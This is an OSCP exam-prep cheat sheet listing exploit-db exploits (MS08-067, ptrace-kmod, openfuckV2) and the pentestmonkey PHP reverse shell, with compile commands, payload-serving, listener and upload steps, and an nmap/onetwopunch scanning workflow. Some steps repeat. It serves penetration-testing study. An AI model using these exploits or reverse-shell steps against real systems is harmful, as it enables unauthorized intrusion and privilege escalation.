# cheatsheets and exploit code and scripts / OSCP
 

**python ms08-067 remote exploit** (https://www.exploit-db.com/exploits/40279)

edit `shellcode` variable with payload and adjusts NOPS to fit it

---

**ptrace-kmod Linux privilege escalation** Works for 2.2.x and 2.4.x kernels. (https://www.exploit-db.com/exploits/3) 
```c
// #include <linux/user.h>
#include <sys/user.h>
#include <sys/reg.h>
```

---

**mod_ssl 2.8.7 open ssl exploit (openfuckv2)** (https://www.exploit-db.com/exploits/764)
commented out #COMMAND2 to download, compile and execute privilege escalation using ptrace-kmod.c

1. compile code
`gcc -o openfuck openfuckV2.c -lcrypto`

_if you encounter missing ld error while compiling at victim machine, try checking PATH and make sure it is pointing to the 'ld' file_

2. In your ptrace-kmod.c directory start webserver
`python -m SimpleHTTPServer 80`

---

**php reverse shell** (http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
Works like a charm in linux php LFI situations better than `system('<reverse shell bash code>');`

1. modify code
```c
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```
2. start listener to catch reverse shell
3. upload and run script
--- 

**Onetwopunch.sh** (https://raw.githubusercontent.com/superkojiman/onetwopunch/master/onetwopunch.sh) 
Wrapper for unicornscan (fast port scan) and nmap (vuln script scan)

1. ping sweep for online hosts into list
`nmap -v -sn 10.11.1-254 -oG all-hosts.txt`
`grep Up all-hosts.txt > online.hosts.txt`

2. download onetwopunch script
`wget https://raw.githubusercontent.com/superkojiman/onetwopunch/master/onetwopunch.sh`
 
3. run script with nmap -sV option
`./scripts/onetwopunch.sh -t online-hosts.txt -p all -i tap0 -n -sV`
 
4. Once complete, navigate to output folder "ndir". Use command to formats all .xml output to html
`for x in $(ls *.xml); do filename=$(echo $x | sed 's/xml/html/') && xsltproc $x -o $filename; done`
`wget https://raw.githubusercontent.com/superkojiman/onetwopunch/master/onetwopunch.sh`
`./scripts/onetwopunch.sh -t online-hosts.txt -p all -i tap0 -n -sV`

5. Navigate to output folder "ndir" and formats all .xml output to html
`for x in $(ls *.xml); do filename=$(echo $x | sed 's/xml/html/') && xsltproc $x -o $filename; done`
